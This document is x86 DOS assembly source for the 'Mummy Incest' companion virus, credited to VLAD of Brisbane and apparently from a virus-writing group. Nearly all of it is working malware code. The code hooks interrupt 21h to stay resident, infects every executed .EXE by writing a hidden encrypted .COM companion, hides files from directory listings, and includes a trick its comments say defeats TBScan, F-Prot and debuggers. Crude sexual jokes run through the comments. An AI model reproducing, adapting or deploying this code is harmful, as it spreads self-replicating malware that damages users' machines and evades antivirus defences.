start:                                                                        
       mov     word ptr quit,20cdh                                            
quit:                                 ;Kill TBScan, FProt, TBClean and Debug  
       mov     word ptr quit,06c7h     ;Restore the bytes.                    
                                                                              
       mov     si,offset enc_start                                            
       call    encrypt                                                        
                                                                              
enc_start:                                                                    
                                                                              
       mov     word ptr cs:psp,es              ;Setup comline.                
                                                                              
       mov     ah,4ah                          ;Resize memory block so we     
       mov     bx,50                           ;have enough memory to execute 
       int     21h                             ;the infected program.         
                                                                              
       mov     ax,word ptr ds:[2ch]            ;Environment segment.          
                                                                              
       mov     ds,ax                           ;DS = environment.             
                                                                              
       xor     si,si                                                          
scan:                                                                         
       inc     si                                                             
       cmp     byte ptr ds:si,0                ;Search for a zero.            
                                                                              
       jne     scan                                                           
                                                                              
       cmp     byte ptr ds:[si+1],0            ;Double zero - end of envir.   
       jne     scan                                                           
                                                                              
       add     si,4                            ;Index to filename.            
       mov     dx,si                                                          
scan2:                                                                        
       inc     si                                                             
       cmp     byte ptr ds:si,'.'              ;Look for end of .EXT          
                                                                              
       jne     scan2                                                          
                                                                              
       mov     word ptr ds:[si+1],'XE'         ;Change to .EXE                
       mov     byte ptr ds:[si+3],'E'                                         
                                                                              
       push    dx                              ;Save filename offset          
                                                                              
       ;Test for residency...                                                 
       mov     ah,61h                          ;Mummy!!!                      
       mov     di,'MU'                                                        
       mov     bx,'M'                                                         
       int     21h                                                            
                                                                              
       cmp     cx,'MU'                         ;Is Mummy home ?               
       jne     execute                                                        
       cmp     dx,'M'                                                         
       jne     execute                                                        
                                                                              
       mov     cs:byte ptr resident,1                                         
                                                                              
execute:                                                                      
       pop     dx                                                             
                                                                              
       mov     ax,4b00h                        ;Execute the .EXE file!        
       mov     bx,offset parameter             ;Parameter table.              
       int     21h                                                            
                                                                              
       push    cs                                                             
       pop     ds                                                             
                                                                              
       cmp     byte ptr resident,1                                            
       je      normal_jend                                                    
                                                                              
       mov     byte ptr resident,0                                            
                                                                              
       mov     ax,3521h                        ;Get int 21h                   
       int     21h                                                            
                                                                              
       mov     word ptr i21,bx                 ;Set int 21h to our virus.     
       mov     word ptr i21_2,bx                                              
       mov     word ptr i21+2,es                                              
       mov     word ptr i21_2+2,es                                            
                                                                              
       mov     ah,61h                          ;Lets have incest...           
       mov     di,'IN'                                                        
       int     21h                                                            
                                                                              
       cmp     di,'NI'                         ;Is another family member      
                                               ;home ?                        
       jne     not_incest                                                     
                                               ;Yeh!  Lets fuck!              
                                                                              
       mov     word ptr i21_2,cx               ;The original interrupt        
       mov     word ptr i21_2+2,dx             ;passes from the other virus   
                                               ;to Mummy.                     
                                               ;Dont it feel good!            
not_incest:                                                                   
       mov     ax,2521h                        ;Point to our handler.         
       mov     dx,offset int_handler                                          
       int     21h                                                            
                                                                              
       mov     ax,3100h                        ;Mummy hops in bed.            
       mov     dx,80                          ;Shes got lots of work to do!   
       int     21h                                                            
                                                                              
normal_jend:                                                                  
                                                                              
       mov     ax,4c00h                        ;Quit.                         
       int     21h                                                            
                                                                              
;data                                                                         
       parameter       dw      0                                              
       com_line        dw      80h                                            
       psp     dw      0                                                      
       db      0bh dup (0)     ;Exec parameter table.                         
                                                                              
       Resident        db      0                                              
                                                                              
       db      '[Mummy Incest] by VLAD of Brisbane.',0                        
       db      'Breed baby breed!'                                            
                                                                              
int_handler     proc    near                                                  
                                                                              
       cmp     ah,4bh                          ;Execute instruction.          
       jne     test_other                                                     
                                                                              
       cmp     byte ptr cs:flag,1              ;Was a residency test          
       jne     infect                          ;just used ?                   
                                                                              
       mov     byte ptr cs:flag,0                                             
                                                                              
       jmp     far_ret                                                        
                                                                              
test_other:                                                                   
       ;Residency check                                                       
       ;If residentcy test then pass back values and set flag=1               
                                                                              
       ;insert residency test here...                                         
                                                                              
       cmp     ah,61h                                                         
       jne     hide_files                                                     
                                                                              
       cmp     di,'MU'                 ;Testing for residency ?               
       jne     chk4incest                                                     
       cmp     bx,'M'                                                         
       jne     chk4incest                                                     
                                                                              
       mov     cx,'MU'                                                        
       mov     dx,'M'                  ;Return test parameters.               
       mov     byte ptr cs:flag,1                                             
       iret                                                                   
                                                                              
chk4incest:                                                                   
       ;incest passing                                                        
       cmp     di,'IN'                         ;More family fun!              
       jne     far_ret                                                        
                                                                              
       mov     di,'NI'                         ;Put the interrupt out!        
       mov     cx,word ptr cs:[i21_2]                                         
       mov     dx,word ptr cs:[i21_2 + 2]      ;Mummy is dominant!            
       iret                                                                   
                                                                              
hide_files:                                                                   
       cmp     ah,4eh                          ;Findfirst                     
       jne     outa_here                                                      
                                                                              
       and     cx,0fffdh                       ;Remove 'hidden' attribute.    
                                                                              
outa_here:                                                                    
       jmp     far_ret                         ;Back to original interrupt.   
                                                                              
infect:                                                                       
                                                                              
       push    ax                                                             
       push    bx                                                             
       push    cx                                                             
       push    dx                              ;Save everything.              
       push    es                                                             
       push    ds                                                             
       push    si                                                             
       push    di                                                             
                                                                              
       mov     si,dx                           ;Filename into SI              
test_dot:                                                                     
       inc     si                                                             
       cmp     byte ptr ds:[si],'.'            ;The '.' in '.EXE'             
       jne     test_dot                                                       
       inc     si                                                             
       cmp     word ptr ds:[si],'XE'           ;EXE ?                         
       jne     far_pop                                                        
       cmp     byte ptr ds:[si+2],'E'                                         
       jne     far_pop                         ;Nope.                         
       mov     word ptr ds:[si],'OC'           ;Change it to its '.COM'       
       mov     byte ptr ds:[si+2],'M'          ; counterpart.                 
                                                                              
       mov     ah,3ch                          ;Create file.                  
       mov     cx,2                            ;Make it hidden.               
       call    int21h                                                         
                                                                              
       mov     bx,ax                           ;File handle into BX           
                                                                              
       push    cs                                                             
       pop     ds                              ;ES & DS = CS                  
       push    cs                                                             
       pop     es                                                             
                                                                              
       inc     byte ptr encryptor              ;Fix encryptor.                
       jnz     copy_virus                                                     
       inc     byte ptr encryptor                                             
                                                                              
copy_virus:                                                                   
                                                                              
       mov     cx,length                       ;Virus length into CX          
       mov     si,100h                         ;Start of virus.               
       mov     di,offset finish                ;Place to move virus to.       
       rep     movsb                           ;Move it!                      
                                                                              
       mov     si,offset finish + 18           ;Start encrypting here.        
       call    encrypt                         ;Encrypt the sucker.           
                                                                              
       mov     ah,40h                          ;Mummy is having a baby!       
       mov     cx,length                                                      
       mov     dx,offset finish                                               
       call    int21h                                                         
                                                                              
       mov     ah,3eh                          ;Close file.                   
       call    int21h                                                         
                                                                              
far_pop:                                                                      
                                                                              
       pop     di                                                             
       pop     si                                                             
       pop     ds                                                             
       pop     es                                                             
       pop     dx                              ;Restore everything.           
       pop     cx                                                             
       pop     bx                                                             
       pop     ax                                                             
                                                                              
far_ret:                                                                      
                                                                              
       db      0eah                            ;Jumpf                         
       i21     dd      0                                                      
                                                                              
int21h  proc    near                                                          
       pushf                                                                  
       ;opcode for callf                                                      
       db 9ah                                  ;Callf                         
       i21_2   dd  0                                                          
                                                                              
       ret                                                                    
int21h  endp                                                                  
                                                                              
enc_end:                                        ;Stop encrypting here.        
                                                                              
       flag    db      0                                                      
                                                                              
int_handler     endp                                                          
                                                                              
encrypt proc    near                            ;Encrypt it.                  
                                                                              
;SI=start bit                                                                 
                                                                              
       mov     al,byte ptr cs:encryptor                                       
                                                                              
       push    cx                                                             
                                                                              
       mov     cx,offset enc_end - offset enc_start                           
                                                                              
enc_loop:                                                                     
       xor     byte ptr [si],al                                               
       neg     al                                                             
       rol     al,1                            ;Stuff around with AL.         
       inc     si                                                             
       loop    enc_loop                                                       
                                                                              
       pop     cx                                                             
                                                                              
       ret                                                                    
                                                                              
encrypt endp                                                                  
                                                                              
       encryptor       db      0                                              
                                                                              
finish:                                                                       
       length  equ offset finish - 100h                                       
